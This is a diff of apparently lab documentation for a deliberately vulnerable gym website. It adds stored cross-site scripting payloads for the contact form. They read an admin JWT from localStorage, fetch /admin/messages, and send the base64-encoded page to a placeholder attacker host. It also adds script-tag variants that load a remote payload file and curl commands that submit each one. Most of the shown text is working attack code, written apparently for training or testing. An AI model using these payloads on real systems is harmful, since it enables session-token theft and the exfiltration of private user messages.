@@ -496,6 +496,8 @@ Expected:
 
 ### Protected message list exfiltration with explicit JWT
 
+Inline reference version:
+
 ```html
 <script>
 const token = localStorage.getItem('gym_internal_token');
@@ -515,6 +517,22 @@ fetch('/admin/messages', {
     });
   });
 </script>
+```
+
+This inline version does not fit in the current `250` character `message` field.
+
+### Protected message list exfiltration via external JavaScript
+
+Use this one through the public form:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
+```
+
+Same-host validation shortcut:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-messages-with-jwt.js"></script>
 ```
 
 Expected in vulnerable mode:
@@ -621,12 +639,24 @@ curl -i -X POST http://cross.fit/contact \
 
 ### `/admin/messages` exfiltration payload with explicit JWT
 
+This is the inline reference version and it does not fit in the current `250` character `message` field.
+
 ```bash
 curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS 2" \
   -d "email=xss2@example.com" \
   -d "phone=099000001" \
   --data-urlencode "message=<script>const token=localStorage.getItem('gym_internal_token');fetch('/admin/messages',{headers:{Authorization:'Bearer '+token}}).then(r=>r.text()).then(html=>{const b64=btoa(unescape(encodeURIComponent(html)));fetch('http://attacker_machine_ip:9000/internal-html',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:b64});});</script>"
+```
+
+### `/admin/messages` exfiltration via external JavaScript
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Messages JS" \
+  -d "email=xss-messages-js@example.com" \
+  -d "phone=099000015" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js\"></script>"
 ```
 
 ## Worker Behavior
